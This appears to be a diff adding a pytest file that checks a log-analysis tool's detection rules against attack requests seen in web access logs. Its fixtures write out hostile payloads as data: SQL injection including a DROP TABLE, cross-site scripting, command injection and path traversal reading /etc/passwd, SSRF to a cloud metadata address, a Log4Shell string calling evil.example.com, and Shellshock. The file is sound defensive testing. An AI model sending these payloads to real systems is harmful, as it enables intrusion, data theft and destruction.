@@ -1,0 +1,195 @@
+"""Tests for the rule packs that ship with the tool.
+
+These are the closest thing the project has to acceptance tests for detection:
+each case is a payload seen in the wild, asserted to reach the right category.
+"""
+
+from __future__ import annotations
+
+from datetime import UTC, datetime, timedelta
+
+import pytest
+
+from logarc.core.activity import ActivityCategory
+from logarc.core.event import NormalizedEvent
+from logarc.core.evidence import EvidenceRef
+from logarc.detect.engine import RuleEngine
+from logarc.detect.rulepacks import DEFAULT_RULEPACK_DIR, default_rules
+from logarc.detect.rules import load_rules
+
+START = datetime(2024, 5, 1, 12, 0, tzinfo=UTC)
+
+
+@pytest.fixture(scope="module")
+def engine() -> RuleEngine:
+    return RuleEngine(default_rules())
+
+
+def request(
+    target: str,
+    *,
+    status: int = 200,
+    user_agent: str | None = "Mozilla/5.0",
+    seconds: float = 0,
+) -> NormalizedEvent:
+    path, _, query = target.partition("?")
+    return NormalizedEvent(
+        timestamp=START + timedelta(seconds=seconds),
+        client_ip="203.0.113.5",
+        evidence=EvidenceRef("access.log", int(seconds) + 1),
+        method="GET",
+        path=path,
+        query=query or None,
+        status=status,
+        bytes_sent=512,
+        user_agent=user_agent,
+    )
+
+
+def test_the_bundled_packs_load() -> None:
+    rules = default_rules()
+
+    assert len(rules) > 20
+    assert DEFAULT_RULEPACK_DIR.is_dir()
+
+
+def test_every_bundled_rule_has_a_unique_id() -> None:
+    ids = [rule.id for rule in default_rules()]
+
+    assert len(ids) == len(set(ids))
+
+
+def test_owasp_mappings_use_the_expected_notation() -> None:
+    for rule in default_rules():
+        if rule.owasp is not None:
+            assert rule.owasp.startswith("A") and ":2021" in rule.owasp
+
+
+@pytest.mark.parametrize(
+    ("target", "expected"),
+    [
+        ("/products?id=1 UNION SELECT username,password FROM users", ActivityCategory.INJECTION),
+        ("/products?id=1' OR '1'='1", ActivityCategory.INJECTION),
+        ("/p?id=1;SELECT pg_sleep(10)--", ActivityCategory.INJECTION),
+        (
+            "/p?id=1 AND 1=1 UNION SELECT table_name FROM information_schema.tables",
+            ActivityCategory.INJECTION,
+        ),
+        ("/p?id=1; DROP TABLE users--", ActivityCategory.INJECTION),
+        ("/search?q=<script>alert(1)</script>", ActivityCategory.INJECTION),
+        ("/p?next=javascript:alert(1)", ActivityCategory.INJECTION),
+        ("/ping?host=127.0.0.1;cat /etc/passwd", ActivityCategory.PATH_TRAVERSAL),
+        ('/api?filter={"$where":"1==1"}', ActivityCategory.INJECTION),
+        ("/download?file=../../../../etc/passwd", ActivityCategory.PATH_TRAVERSAL),
+        ("/download?file=..%2f..%2f..%2fetc%2fpasswd", ActivityCategory.PATH_TRAVERSAL),
+        ("/.env", ActivityCategory.RECONNAISSANCE),
+        ("/.git/config", ActivityCategory.RECONNAISSANCE),
+        ("/backup.sql", ActivityCategory.RECONNAISSANCE),
+        ("/phpinfo.php", ActivityCategory.RECONNAISSANCE),
+        ("/fetch?url=http://169.254.169.254/latest/meta-data/", ActivityCategory.SSRF),
+        ("/fetch?url=file:///etc/passwd", ActivityCategory.SSRF),
+    ],
+)
+def test_known_payloads_reach_the_right_category(
+    engine: RuleEngine, target: str, expected: ActivityCategory
+) -> None:
+    """Asserts the category is among the matches rather than that it won.
+
+    A payload can honestly be two things at once — `file:///etc/passwd` in a
+    parameter is both SSRF and an attempt to read a system file — and which one
+    leads is a precedence decision, not a detection one. Pinning the primary
+    label here would turn a taxonomy judgement into a test failure.
+    """
+    (labelled,) = engine.label_events([request(target)])
+
+    matched = {label.category for label in labelled.all_labels}
+    assert expected in matched, (
+        f"{target!r} matched {[label.rule_id for label in labelled.all_labels] or 'nothing'}"
+    )
+
+
+def test_log4shell_is_detected_in_the_user_agent(engine: RuleEngine) -> None:
+    (labelled,) = engine.label_events(
+        [request("/", user_agent="${jndi:ldap://evil.example.com/a}")]
+    )
+
+    assert labelled.label.rule_id == "log4shell_jndi"
+    assert labelled.label.category is ActivityCategory.EXPLOITATION
+
+
+def test_shellshock_is_detected_in_the_user_agent(engine: RuleEngine) -> None:
+    (labelled,) = engine.label_events(
+        [request("/cgi-bin/x", user_agent="() { :; }; /bin/cat /etc/passwd")]
+    )
+
+    assert labelled.label.rule_id == "shellshock"
+
+
+def test_a_scanner_announces_itself(engine: RuleEngine) -> None:
+    (labelled,) = engine.label_events([request("/", user_agent="sqlmap/1.7#stable")])
+
+    assert labelled.label.rule_id == "scanner_user_agent"
+
+
+def test_directory_enumeration_is_seen_across_requests(engine: RuleEngine) -> None:
+    events = [request(f"/admin{n}", status=404, seconds=n) for n in range(25)]
+
+    labelled = engine.label_events(events)
+
+    assert any(item.label.rule_id == "directory_enumeration" for item in labelled)
+
+
+def test_credential_attack_is_seen_across_requests(engine: RuleEngine) -> None:
+    events = [request("/login", status=401, seconds=n * 2) for n in range(20)]
+
+    labelled = engine.label_events(events)
+
+    assert any(item.label.rule_id == "credential_attack" for item in labelled)
+
+
+@pytest.mark.parametrize(
+    "target",
+    [
+        "/",
+        "/index.html",
+        "/products/shoes",
+        "/assets/app.css",
+        "/images/logo.png",
+        "/search?q=running+shoes",
+        "/api/v1/products?page=2",
+        "/blog/2024/05/a-post-about-unions",
+        "/cart?add=17&quantity=2",
+    ],
+)
+def test_ordinary_traffic_is_not_flagged_as_hostile(engine: RuleEngine, target: str) -> None:
+    """False positives on normal browsing would bury the real findings."""
+    (labelled,) = engine.label_events([request(target)])
+
+    assert not labelled.label.category.is_hostile, (
+        f"{target!r} was flagged as {labelled.label.rule_id!r}"
+    )
+
+
+def test_packs_can_be_extended_with_a_local_pack(tmp_path) -> None:  # type: ignore[no-untyped-def]
+    """Investigators add their own detections without touching the code."""
+    local = tmp_path / "local.yaml"
+    local.write_text(
+        """
+version: 1
+rules:
+  - id: house_rule
+    name: House Rule
+    category: reconnaissance
+    severity: low
+    match:
+      any:
+        - field: path_decoded
+          contains: '/honeypot'
+""",
+        encoding="utf-8",
+    )
+
+    engine = RuleEngine([*default_rules(), *load_rules([local])])
+    (labelled,) = engine.label_events([request("/honeypot")])
+
+    assert labelled.label.rule_id == "house_rule"
